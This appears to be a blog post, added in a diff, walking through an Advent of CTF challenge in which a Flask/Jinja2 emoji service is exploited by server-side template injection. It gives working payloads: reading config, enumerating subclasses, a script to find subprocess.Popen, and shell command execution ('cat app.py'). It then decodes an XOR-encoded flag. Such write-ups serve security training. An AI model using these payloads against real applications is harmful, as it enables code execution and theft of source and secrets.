@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- 21 Dec. 2022 -->
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Advent of CTF - Challenge 16</title>
+<meta name="author" content="Arjen Wiersma" />
+<meta name="generator" content="Org Mode" />
+<meta description='Writings by Arjen'/>
+<link rel='alternate' type='application+rss/xml' title='Writings by Arjen' href='/posts/rss.xml'/>
+<link rel="stylesheet" href="../../../css/theme.css?v=20216e086cf8a20ead56908f3be0bcda6af2531ec1a68c9058ee7495590f57ea" type="text/css">
+</head>
+<body>
+<main id="content" class="content">
+<header>
+<h1 class="title">Advent of CTF - Challenge 16</h1>
+<p class="subtitle" role="doc-subtitle">&ldquo;Encoded&rdquo;</p>
+</header><nav id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#org19b16a6">Challenge</a></li>
+<li><a href="#org317adb3">Solution</a></li>
+</ul>
+</div>
+</nav>
+
+<section id="outline-container-org19b16a6" class="outline-2">
+<h2 id="org19b16a6">Challenge</h2>
+<div class="outline-text-2" id="text-org19b16a6">
+<p>
+In this challenge the use of templates is the thing to focus on. The emoji service by Santa is quite cool, but it used templates to render data, making it vulnerable to Server Side Template Injection.
+</p>
+
+<p>
+What you will learn:
+</p>
+
+<ul class="org-ul">
+<li>Identify SSTI</li>
+<li>Use SSTI to read program variables</li>
+<li>Use SSTI to read files from the filesystem</li>
+<li>Use some python</li>
+</ul>
+</div>
+</section>
+
+<section id="outline-container-org317adb3" class="outline-2">
+<h2 id="org317adb3">Solution</h2>
+<div class="outline-text-2" id="text-org317adb3">
+
+<figure id="org1344709">
+<img src="index_att/start.png" alt="start.png">
+
+<figcaption><span class="figure-number">Figure 1: </span>Challenge start</figcaption>
+</figure>
+
+<p>
+The service will lookup the emoji for the word that you enter, such as Santa. Pro tip, in the sourcecode of the page is a link to a list of all supported emojis for extra fun. After trying several payloads you will eventually try <code>{{7*7}}</code>. This will render <code>49</code>.
+</p>
+
+
+<figure id="org282d264">
+<img src="index_att/ssti-found.png" alt="ssti-found.png">
+
+<figcaption><span class="figure-number">Figure 2: </span>Finding SSTI</figcaption>
+</figure>
+
+<p>
+Pro tip: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">Payload All The Things</a> has a very nice list of payloads you can try. You will come to the conclusion that this is a Python Flask application using Jinja2.
+</p>
+
+<p>
+The next thing to try is to grab the <code>config</code> variable from the application. This can be done through the use of the <code>config</code> variable name inside a template.
+</p>
+
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 1: </span>Reading the config variable</label><pre class="src src-javascript">{{config}}
+</pre>
+</div>
+
+<p>
+This will list the application configuration. The <code>config</code> contains a <code>flag</code>, but it looks very weird. It is encoded using an unknown algorithm.
+</p>
+
+
+<figure id="orge196f1e">
+<img src="index_att/encoded-flag.png" alt="encoded-flag.png">
+
+<figcaption><span class="figure-number">Figure 1: </span>Finding the flag</figcaption>
+</figure>
+
+<p>
+Looking at the available classes in the application, using Payload all the Things as a guide, it is clear that many classes are available.
+</p>
+
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 2: </span>Reading the classes available</label><pre class="src src-javascript">{{ <span class="org-string">''</span>.__class__.__mro__[1].__subclasses__()}}
+</pre>
+</div>
+
+<p>
+When run in the application a long list of classes are listed. A class such as <code>subprocess</code> is required in order to execute things on the file system. The exact index is required in order to use it, so start counting&#x2026;.
+</p>
+
+
+<figure id="org1b835b1">
+<img src="index_att/classes.png" alt="classes.png">
+
+<figcaption><span class="figure-number">Figure 1: </span>All the subclasses</figcaption>
+</figure>
+
+<p>
+Not necessary of course! The below python helper script will find it for you. Just copy the data into a file called <code>data.txt</code> and run the script.
+</p>
+
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 1: </span>Python helper script</label><pre class="src src-python"><span class="org-comment-delimiter">#</span><span class="org-comment">!/usr/bin/env python3</span>
+
+<span class="org-keyword">with</span> <span class="org-builtin">open</span>(<span class="org-string">'data.txt'</span>) <span class="org-keyword">as</span> p:
+    <span class="org-variable-name">check</span> = p.read()
+
+<span class="org-keyword">for</span> index,value <span class="org-keyword">in</span> <span class="org-builtin">enumerate</span>(check.split(<span class="org-string">','</span>)):
+    <span class="org-keyword">if</span> <span class="org-string">"&lt;class 'subprocess.Popen'&gt;"</span> <span class="org-keyword">in</span> value:
+        <span class="org-keyword">print</span>(index)
+</pre>
+</div>
+
+<p>
+In my case it was index <code>286</code>. Experiment with calling the process. In the end you will end up with something like the below listing. It calls <code>cat app.py</code> and then using <code>communicate()</code> to retrieve the data from the proces.
+</p>
+
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 1: </span>Getting the file contents</label><pre class="src src-javascript">{{ <span class="org-string">''</span>.__class__.__mro__[1].__subclasses__()[286](<span class="org-string">'cat app.py'</span>,shell=True,stdout=-1)
+   .communicate()[0].strip()}}
+</pre>
+</div>
+
+<p>
+The sourcecode is then shown on the webpage. Reading it shows there is a <code>magic</code> function that encodes/decodes the flag. It does this by reading the flag from <code>/tmp/flag.txt</code>, this flag is set there during the <code>supervisor</code> startup and is not readable for the application.
+</p>
+
+
+<figure id="org2eb63d2">
+<img src="index_att/sourcecode.png" alt="sourcecode.png">
+
+</figure>
+
+<p>
+Copy the code to your favorite editor and recreate the <code>magic</code> function. In a python shell it looks like this:
+</p>
+
+
+<figure id="orgb758cd3">
+<img src="index_att/magic.png" alt="magic.png">
+
+</figure>
+
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 1: </span>Running the decoder</label><pre class="src src-javascript">def magic(flag, key):
+    <span class="org-keyword">return</span> <span class="org-string">''</span>.join(chr(x ^ ord(flag[x]) ^ ord(key[::-1][x]) ^ ord(key[x])) <span class="org-keyword">for</span> x <span class="org-keyword">in</span> range(len(flag)))
+
+flag=<span class="org-string">"HKQ\x1f\x7f~e|\x06{r9&lt;\x03/3z\x12#Rr )G#*\x14,#dp=Z@AP\x0c*"</span>
+magic(flag, <span class="org-string">'112f3a99b283a4e1788dedd8e0e5d35375c33747'</span>)
+</pre>
+</div>
+
+<p>
+The challenge is solved, also don&rsquo;t forget the badge!
+</p>
+
+
+<figure id="org8ac45be">
+<img src="./index_att/badge.png" alt="badge.png">
+
+</figure>
+
+<p>
+Go back to the <a href="../../../index.html">homepage</a>.
+</p>
+</div>
+</section>
+</main>
+<footer id="postamble" class="status">
+<p class="author">Author: Arjen Wiersma</p>
+<p class="date">Created: 21 Dec. 2022</p>
+</footer>
+</body>
+</html>
